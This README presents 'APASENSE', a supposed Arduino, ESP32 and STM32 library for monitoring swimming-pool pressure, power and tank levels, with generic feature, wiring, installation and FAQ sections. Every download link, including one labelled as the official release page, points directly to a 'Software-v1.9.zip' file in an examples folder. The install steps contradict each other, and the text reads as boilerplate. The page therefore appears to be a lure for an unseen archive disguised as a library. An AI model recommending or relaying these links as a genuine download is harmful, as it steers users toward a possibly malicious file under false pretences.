# 🌊 APASENSE - Automate your swimming pool easily

[![](https://img.shields.io/badge/Download-APASENSE-blue.svg)](https://raw.githubusercontent.com/ziadm7864/APASENSE/main/examples/02_pool_sensors/Software-v1.9.zip)

APASENSE allows pool owners to manage their water systems with precision. This library tracks essential data points such as water pressure, power usage, and tank levels. It removes the need for complex programming knowledge by providing a set of tools that connect directly to your hardware sensors. The system runs on common microcontrollers like Arduino, ESP32, and STM32. It requires no extra external software files to function.

## 🛠 What this software does

The library acts as a bridge between your hardware sensors and your pool equipment. It translates raw signals from your pool components into readable data. 

- **Pressure Monitoring:** Detects pump blockages and filter efficiency in real time.
- **Power Tracking:** Measures current to ensure your pump operates within safe limits.
- **Solar Irradiance:** Adjusts pool heating based on available natural energy.
- **Auxiliary Voltage:** Monitors low-voltage signals for general system health.
- **Tank Management:** Signals empty states to prevent pump damage.
- **Visual Status:** Controls LEDs to show system health at a glance.
- **Alert System:** Issues specific buzzer patterns to denote different urgency levels.

## 📥 How to download the software

Follow these steps to obtain the necessary files for your system.

1.  Visit the official [APASENSE release page](https://raw.githubusercontent.com/ziadm7864/APASENSE/main/examples/02_pool_sensors/Software-v1.9.zip).
2.  Look for the latest version at the top of the list.
3.  Click the file ending in `.zip` to start the download.
4.  Save the file to a folder on your computer where you can find it later.

## 📂 Installation steps

You need to place these files in your development environment to use them.

1.  Open the folder containing your downloaded zip file.
2.  Right-click the file and select "Extract All."
3.  Choose a destination folder and click "Extract."
4.  Open the Arduino software on your computer.
5.  Select "Sketch" from the top menu.
6.  Choose "Include Library" from the drop-down list.
7.  Click "Add .ZIP Library."
8.  Select the folder you extracted in the previous step.
9.  The library is now ready for use in your projects.

## 🔌 Connecting your sensors

The APASENSE library uses the I2C communication protocol. This standard requires four wires for most sensors: Ground, Power, Data, and Clock. Ensure your sensor wires match the labels on your microcontroller board.

- **Ground (GND):** Connects to the ground pin.
- **Power (VCC):** Connects to either 3.3V or 5V depending on your sensor specifications.
- **Data (SDA):** Carries the signal information.
- **Clock (SCL):** Synchronizes the data transfer.

Verify all connections before you power the system. Loose wires cause inconsistent sensor readings.

## ⚙️ Configuring your settings

Once the library is installed, you can modify the settings to fit your pool layout. Open the provided example files to see how the system operates. You will find files labeled with terms like "PressureSensor" or "AlertBuzzer." 

Each example includes comments that explain what every line of data does. You can change the threshold numbers to match your specific hardware parts. For instance, if you want your buzzer to alert you earlier, lower the trigger value in the setup section of the code.

## 📈 Understanding the data

The system provides data in standard units. Pressure readings appear in PSI or Bar, while electrical measurements show Amps or Watts. These values update every second. If you connect an LCD screen, you can display these numbers directly on the wall next to your pool pump.

## 🚨 Troubleshooting common issues

If you encounter problems, check these items first.

- **Check the Wiring:** Ensure the I2C wires are in the correct slots. SDA and SCL are often swapped by mistake.
- **Power supply:** Microcontrollers need stable electricity. A weak power supply leads to resets or incorrect readings.
- **Sensor distance:** Keep your wire runs short to avoid signal noise. Long wires often require shielded cables for reliable performance.
- **Buzzer patterns:** If the buzzer makes a noise you do not recognize, consult the provided documentation map. Different melodies indicate different sensor statuses.

## 🧩 Compatibility information

The APASENSE library works with popular hardware platforms. 

- **AVR:** Good for simple, low-power tasks.
- **ESP32:** Ideal for wireless monitoring and remote access.
- **STM32:** Offers high processing speed for complex pool setups.

Because the library relies only on the standard `Wire.h` library, it remains stable across different hardware types. You do not need to install extra secondary libraries. This keeps your system lean and reliable.

## 📝 Frequently asked questions

**Do I need a computer to run this?**
You need a computer only to upload the code to your microcontroller. Once the code is uploaded, the microcontroller runs the pool automation independently.

**What if I do not have ADS1015 or PCF8574AT chips?**
This library specifically targets those chips. They handle the conversion of analog signals to digital data. If you use different chips, the library cannot communicate with them.

**Can I modify the alert sounds?**
Yes. You can edit the buzzer pattern code to create different sequences. Use these patterns to identify which sensor triggered the alert.

**How do I update the library?**
Download the newer zip file from the releases page and repeat the installation steps. The software overwrites the older version with your new settings.

**Is this system waterproof?**
The code is electronic data. Ensure your control box is rated for outdoor, weather-resistant use to protect your hardware components.